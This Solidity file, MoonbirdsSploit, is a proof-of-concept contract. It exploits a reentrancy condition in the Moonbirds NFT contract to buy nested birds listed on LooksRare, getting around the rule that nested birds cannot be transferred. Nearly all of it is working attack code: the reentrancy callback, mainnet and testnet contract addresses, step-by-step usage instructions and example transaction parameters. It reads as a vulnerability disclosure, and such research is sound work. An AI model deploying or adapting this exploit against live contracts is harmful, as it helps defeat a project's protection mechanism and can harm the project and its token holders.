// SPDX-License-Identifier: UNLICENSED
// Creator: Nitesh Dhanjani

pragma solidity 0.8.14;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/*This smart contract is being provided as is. 
No guarantee, representation or warranty is being made, express or implied, as to the safety or correctness of the contract. 
It has not been audited and as such there can be no assurance it will work as intended, and users may experience delays, failures, errors, omissions, 
loss of transmitted information or loss of funds. Nitesh Dhanjani is not liable for any of the foregoing.
Users should proceed with caution and use at their own risk.*/

//This contract exploits a reentrancy condition in the MOONBIRDS contract to purchase 'nested' birds that are listed on LooksRare
//The MOONBIRDS project issues awards and airdrops to birds that are nested
//Unnesting a bird causes it to lose it's current "streak"
//So nested birds are more valuable, but they are not allowed to transfer when in nested state
//This contract is a proof of concept on how to exploit the reentrancy condition to get around the protection mechanism in the MOONBIRDS contract
//The safeTransferWhileNesting function sets the value of nestingTransfer to 2 in the MOONBIRDS contract
//As long as nestingTransfer is set to 2, transfers are allowed
//When safeTransferWhileNesting is called to send a bird to a contract (not a regular wallet), the _transfer function
//checks to see if the contract implements IERC721Receiver (which this contract does) and in turn calls back the onERC721Received function
//on the destination contract which we have implemented. In our onERC721Received, we make the purchase for the target nested bird because we know
//that nestingTransfer is still 2 and so it will go through.

// Thanks https://github.com/Anish-Agnihotri/flashside/blob/master/src/FlashsideLooksRare.sol
// LooksRare order types

library OrderTypes {
    struct MakerOrder {
        bool isOrderAsk; // true --> ask / false --> bid
        address signer; // signer of the maker order
        address collection; // collection address
        uint256 price; // price (used as )
        uint256 tokenId; // id of the token
        uint256 amount; // amount of tokens to sell/purchase (must be 1 for ERC721, 1+ for ERC1155)
        address strategy; // strategy for trade execution (e.g., DutchAuction, StandardSaleForFixedPrice)
        address currency; // currency (e.g., WETH)
        uint256 nonce; // order nonce (must be unique unless new maker order is meant to override existing one e.g., lower ask price)
        uint256 startTime; // startTime in timestamp
        uint256 endTime; // endTime in timestamp
        uint256 minPercentageToAsk; // slippage protection (9000 --> 90% of the final price must return to ask)
        bytes params; // additional parameters
        uint8 v; // v: parameter (27 or 28)
        bytes32 r; // r: parameter
        bytes32 s; // s: parameter
    }

    struct TakerOrder {
        bool isOrderAsk; // true --> ask / false --> bid
        address taker; // msg.sender
        uint256 price; // final price for the purchase
        uint256 tokenId;
        uint256 minPercentageToAsk; // // slippage protection (9000 --> 90% of the final price must return to ask)
        bytes params; // other params (e.g., tokenId)
    }
}

// LooksRare exchange
interface ILooksRareExchange {
    /// @notice Match a taker ask with maker bid
    function matchBidWithTakerAsk(
        OrderTypes.TakerOrder calldata takerAsk,
        OrderTypes.MakerOrder calldata makerBid
    ) external;

    /// @notice Match ask with ETH/WETH bid
    function matchAskWithTakerBidUsingETHAndWETH(
        OrderTypes.TakerOrder calldata takerBid,
        OrderTypes.MakerOrder calldata makerAsk
    ) external payable;
}

interface IMoonBirds {
    function nestingOpen() external returns (bool);

    function ownerOf(uint256 tokenId) external returns (address);

    function isApprovedForAll(address owner, address operator)
        external
        returns (bool);

    function getApproved(uint256 tokenId) external returns (address);

    function nestingPeriod(uint256 tokenID)
        external
        returns (
            bool,
            uint256,
            uint256
        );

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function safeTransferWhileNesting(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function setApprovalForAll(address operator, bool approved) external;

    function toggleNesting(uint256[] calldata tokenIds) external;
}

// Wrapped Ether
interface IWETH {
    /// @notice Deposit ETH to WETH
    function deposit() external payable;

    /// @notice WETH balance
    function balanceOf(address holder) external returns (uint256);

    /// @notice ERC20 Spend approval
    function approve(address spender, uint256 amount) external returns (bool);

    /// @notice ERC20 transferFrom
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract MoonbirdsSploit is IERC721Receiver, Ownable {
    error unApprovedMoonbirdToken();

    /// @dev Contract owner
    address internal immutable OWNER;

    /// @dev Moonbirds  contract
    IMoonBirds internal immutable MOONBIRDS;

    /// @dev LooksRare exchange contract
    ILooksRareExchange internal immutable LOOKSRARE;

    /// @dev Wrapped Ether contract
    IWETH internal immutable WETH;

    OrderTypes.MakerOrder internal pO;

    event logEvent(string message);

    uint256 private birdTransfer = 1;

    address internal immutable mbirds;

    //rinkeby LooksRareExchange 0x1AA777972073Ff66DCFDeD85749bDD555C0665dA
    //mainnet LooksRareExchange 0x59728544b08ab483533076417fbbb2fd0b17ce3a

    //rinkeby WETH 0xc778417E063141139Fce010982780140Aa0cD5Ab
    //mainnet ETH 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2

    //mainnet MOONBIRDS 0x23581767a106ae21c074b2276D25e5C3e136a68b

    constructor(
        address moonbirds,
        address looksrare,
        address weth
    ) payable {
        OWNER = msg.sender;

        MOONBIRDS = IMoonBirds(moonbirds);

        LOOKSRARE = ILooksRareExchange(looksrare);

        WETH = IWETH(weth);

        mbirds = moonbirds;

        // Setup max approval amount
        uint256 maxApproval = 2**256 - 1;

        // Give LooksRare exchange infinite approval to spend wETH
        WETH.approve(looksrare, maxApproval);

        MOONBIRDS.setApprovalForAll(looksrare, true);
    }

    //Example sucessful purchase of Nested bird https://rinkeby.etherscan.io/tx/0xff94dab2512c6c2e06a3b0eef7b0dd6db396e8d13de03a76aa60ccc821ad137e

    //1. You must have an unnested Moonbird to send to this contract. Perform an approve call on the Moonbirds contract for the addresss of this deployed
    //   contract and pass in it's tokenId. The bird will be returned to you, nested :)
    //2. Find a nested bird on LooksRare and note down it's tokenID
    //   See https://looksrare.github.io/api-docs/#/Orders/OrderController.getOrders to get the listing information to put in purchaseOrder.
    //   Example remix parameter input for the above test transaction based on a listing of a nested bird (rinkeby):
    //      1,["true","0x9458549B19679314e3F9F67235d5Cfdee029112E","0x015d4E6533125EE998a394bDD89d877e3debCe68","100000000000000000",0,1,"0x732319A3590E4fA838C111826f9584a9A2fDEa1a",
    //      "0xc778417E063141139Fce010982780140Aa0cD5Ab",1,1653843158,1656435143,8500,"0x",28,"0xae1417ca085f7a076fa6da9cc9226c8f40ace0f2090c8b5d21e65873a382c01a",
    //      "0x461af5c1b8d5accf341a5c6a8e043d852e57ab808c49323f0388eb4bd54791b1"]

    function buyNestedBirdWithoutUnnesting(
        uint256 tokenId,
        OrderTypes.MakerOrder calldata purchaseOrder
    ) external onlyOwner {
        require(MOONBIRDS.nestingOpen(), "Moonbirds: nesting closed");

        require(
            MOONBIRDS.ownerOf(tokenId) == msg.sender,
            "Moonbirds: ownly owner"
        );

        bool isApproved = (MOONBIRDS.isApprovedForAll(
            msg.sender,
            address(this)
        ) || MOONBIRDS.getApproved(tokenId) == address(this));

        if (!isApproved) revert unApprovedMoonbirdToken();

        pO = purchaseOrder;

        //probably could check for more, but this is enough babysitting
        require(pO.collection == mbirds, "Collection not moonbirds");
        require(pO.price <= WETH.balanceOf(address(this)), "Not enough WETH");

        //make sure bird is not nested, this is because we can't just call safeTransferWhileNesting becasue it's ownerOnly
        bool isNesting;
        (isNesting, , ) = MOONBIRDS.nestingPeriod(tokenId);
        require(!isNesting);

        //could check to make sure the target bird in purcahseOrder is nested, otherwise what's the point?
        //but not implementing the check because everything should still go through even if it's not nested

        //call safeTransferFrom on the Moonbirds contract to send the bird from the msg.sender to this contract
        MOONBIRDS.safeTransferFrom(msg.sender, address(this), tokenId);

        uint256[] memory tokenIds;
        tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        emit logEvent("Nesting the bird");

        //nest the bird
        MOONBIRDS.toggleNesting(tokenIds);

        emit logEvent("Nested the bird");

        birdTransfer = 2;

        emit logEvent("Invoking Reentrancy");
        //send the nested bird from this contract to this contract
        //this will set the value of nestingTransfer to 2 and cause the Moonbirds contract to invoke onERC721Received below
        //where we can buy the nested Moonbird we want on LooksRare without unnesting it
        MOONBIRDS.safeTransferWhileNesting(
            address(this),
            address(this),
            tokenId
        );

        // return the original bird, nested
        MOONBIRDS.safeTransferWhileNesting(address(this), msg.sender, tokenId);

        // transfer the purchased nested bird
        MOONBIRDS.safeTransferWhileNesting(
            address(this),
            msg.sender,
            pO.tokenId
        );
    }

    // @notice Withdraws contract ETH balance to owner address
    function withdrawBalance() external {
        (bool sent, ) = OWNER.call{value: address(this).balance}("");
        if (!sent) revert("Could not withdraw balance");
    }

    /// @notice Withdraw contract WETH balance to owner address
    function withdrawBalanceWETH() external {
        WETH.transferFrom(address(this), OWNER, WETH.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        //Don't want crap from others
        require(tx.origin == OWNER);

        if (birdTransfer == 2) {
            birdTransfer = 1;

            // we are now able to exploit the nestingTransfer reentrancy condition, ie it will be set to 2 allowing transfers of nested birds

            // Setup our taker bid to buy
            OrderTypes.TakerOrder memory purchaseBid = OrderTypes.TakerOrder({
                isOrderAsk: false,
                taker: address(this),
                price: pO.price,
                tokenId: pO.tokenId,
                minPercentageToAsk: pO.minPercentageToAsk,
                params: ""
            });

            // Accept maker ask order and purchase it
            LOOKSRARE.matchAskWithTakerBidUsingETHAndWETH(purchaseBid, pO);
        }
        return this.onERC721Received.selector;
    }
}
